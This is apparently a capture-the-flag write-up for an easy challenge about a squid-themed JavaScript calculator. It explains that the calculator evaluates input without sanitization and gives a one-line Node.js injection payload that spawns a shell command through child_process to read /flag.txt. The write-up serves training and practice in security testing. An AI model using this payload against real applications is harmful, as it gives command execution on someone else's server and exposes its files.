# Info
Difficulty: Easy
# Desc
>In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑
# Writeup

This challenge require us to exploit the code injection in the calculator feature.
It can be exploited in one line, since the application doesn't do any sanitization or filtering.
```Javascript
require("child_process").execSync("cat /flag.txt").toString();
```